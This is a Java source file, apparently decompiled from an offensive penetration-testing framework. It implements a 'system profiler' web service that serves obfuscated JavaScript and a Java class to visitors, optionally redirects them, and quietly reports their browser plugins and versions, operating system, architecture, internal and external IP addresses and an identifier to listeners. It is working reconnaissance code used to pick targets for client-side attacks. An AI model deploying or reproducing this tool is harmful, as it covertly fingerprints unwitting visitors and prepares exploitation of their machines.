package profiler;

import cloudstrike.Response;
import cloudstrike.WebServer;
import cloudstrike.WebService;
import eu.bitwalker.useragentutils.UserAgent;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SystemProfiler implements WebService {
   protected List listeners = new LinkedList();
   protected String my_html = "";
   protected String my_js = "";
   protected String desc;

   public void addProfileListener(ProfileListener l) {
      this.listeners.add(l);
   }

   public void init(boolean redirect, String url, String allowjava) {
      try {
         StringBuffer javascript = new StringBuffer(1000);
         suckItDown("/resources/jquery-1.7.1.min.js", javascript);
         suckItDown("/resources/deployJava.js", javascript);
         suckItDown("/resources/reader.js", javascript);
         StringBuffer html = new StringBuffer(1000);
         if (redirect) {
            suckItDown("/resources/redirect.js", javascript);
            suckItDown("/resources/index.html", html);
         } else {
            suckItDown("/resources/stay.js", javascript);
            suckItDown("/resources/index2.html", html);
         }

         this.my_js = javascript.toString().replace("%URL%", url).replace("%JAVA%", allowjava);
         this.my_html = html.toString().replace("%URL%", url).replace("%JAVA%", allowjava);
         this.my_js = (new Obfuscator(this.my_js)).obfuscate();
      } catch (Exception var6) {
         WebServer.logException("init system profiler", var6, false);
      }

   }

   public static void suckItDown(String resource, StringBuffer append) throws Exception {
      InputStreamReader i = new InputStreamReader(SystemProfiler.class.getResourceAsStream(resource), "UTF-8");

      while(i.ready()) {
         append.append((char)i.read());
      }

   }

   protected Map parseResults(String useragent, String data) {
      Map temp = new HashMap();
      String[] apps = data.split("\n");

      for(int x = 0; x < apps.length; ++x) {
         String[] parse = apps[x].split("\t");
         if (parse[0].length() != 0) {
            if (parse.length == 1) {
               temp.put(parse[0], "");
            } else {
               temp.put(parse[0], parse[1].replaceAll("\\s+r(\\d+)", ".$1.0"));
            }
         }
      }

      boolean is64bitOS = false;
      boolean is64bitBrowser = false;
      if (useragent.contains("WOW64")) {
         is64bitOS = true;
         is64bitBrowser = false;
      } else if (useragent.contains("Win64")) {
         is64bitOS = true;
         is64bitBrowser = true;
      }

      UserAgent agent = new UserAgent(useragent);
      String[] bname = agent.getBrowser().getName().split(" ");
      String key = "";
      if (bname.length <= 2) {
         key = bname[0];
      } else if (bname.length == 3) {
         key = bname[0] + " " + bname[1];
      } else if (bname.length == 4) {
         key = bname[0] + " " + bname[1] + " " + bname[2];
      }

      String os;
      if (!temp.containsKey(key) && agent.getBrowserVersion() != null) {
         if (is64bitBrowser) {
            temp.put(key + " *64", agent.getBrowserVersion().getVersion());
         } else {
            temp.put(key, agent.getBrowserVersion().getVersion());
         }
      } else if (is64bitBrowser) {
         os = temp.get(key) + "";
         temp.remove(key);
         temp.put(key + " *64", os);
      }

      os = agent.getOperatingSystem().getName();
      if (useragent.indexOf("Windows NT 6.2") > -1) {
         os = "Windows 8";
      } else if (useragent.indexOf("Windows NT 10.0") > -1) {
         os = "Windows 10";
      }

      if (is64bitOS) {
         temp.put(os + " *64", "");
      } else {
         temp.put(os, "");
      }

      Pattern[] version = new Pattern[]{Pattern.compile("Mac OS X (\\d+_\\d+_\\d+)"), Pattern.compile("Mac OS X (.*?)\\;")};

      for(int x = 0; x < version.length; ++x) {
         Matcher m = version[x].matcher(useragent);
         if (m.find()) {
            temp.put(agent.getOperatingSystem().getName(), m.group(1).replace("_", "."));
            break;
         }
      }

      return temp;
   }

   public void setup(WebServer server, String uri) {
      server.registerSecondary("/compatible", this);
      server.registerSecondary("/java/iecheck.class", this);
      server.registerSecondary("/check.js", this);
      server.registerSecondary("/compatible", this);
      server.register(uri, this);
   }

   public Response serve(String uri, String method, Properties header, Properties param) {
      if (!uri.equals("/compatible")) {
         if (uri.equals("/java/iecheck.class")) {
            return new Response("200 OK", "application/octet-stream", this.getClass().getClassLoader().getResourceAsStream("resources/java/iecheck.class"));
         } else {
            return uri.equals("/check.js") ? new Response("200 OK", "text/javascript", this.my_js) : new Response("200 OK", "text/html", this.my_html);
         }
      } else {
         Iterator i = this.listeners.iterator();
         String who = header.get("REMOTE_ADDRESS") + "";
         if (who.length() > 1) {
            who = who.substring(1);
         }

         Map results = this.parseResults(header.get("User-Agent") + "", param.get("data") + "");

         while(i.hasNext()) {
            ProfileListener l = (ProfileListener)i.next();
            l.receivedProfile(who, param.get("from") + "", header.get("User-Agent") + "", results, param.get("id") + "");
         }

         return new Response("200 OK", "text/plain", "");
      }
   }

   public SystemProfiler() {
   }

   public SystemProfiler(String desc, String allowjava) {
      this.init(false, "", allowjava);
      this.desc = desc;
   }

   public SystemProfiler(String url, String desc, String allowjava) {
      this.init(true, url, allowjava);
      this.desc = desc;
   }

   public static void main(String[] args) {
      try {
         WebServer server = new WebServer(81);
         SystemProfiler temp = new SystemProfiler("", "true");
         temp.setup(server, "/");
         temp.addProfileListener(new ProfileListener() {
            public void receivedProfile(String external, String internal, String useragent, Map results, String cookie) {
               System.err.println("Received a profile: (" + external + "/" + internal + ")");
               Iterator i = results.entrySet().iterator();

               while(i.hasNext()) {
                  Map.Entry app = (Map.Entry)i.next();
                  System.err.println("     " + app.getKey() + " " + app.getValue());
               }

            }
         });

         while(true) {
            Thread.sleep(60000L);
         }
      } catch (Exception var3) {
         var3.printStackTrace();
      }
   }

   public String toString() {
      return this.desc;
   }

   public String getType() {
      return "profiler";
   }

   public List cleanupJobs() {
      return new LinkedList();
   }

   public boolean suppressEvent(String uri) {
      return "/compatible".equals(uri);
   }

   public boolean isFuzzy() {
      return false;
   }

   public interface ProfileListener {
      void receivedProfile(String var1, String var2, String var3, Map var4, String var5);
   }
}
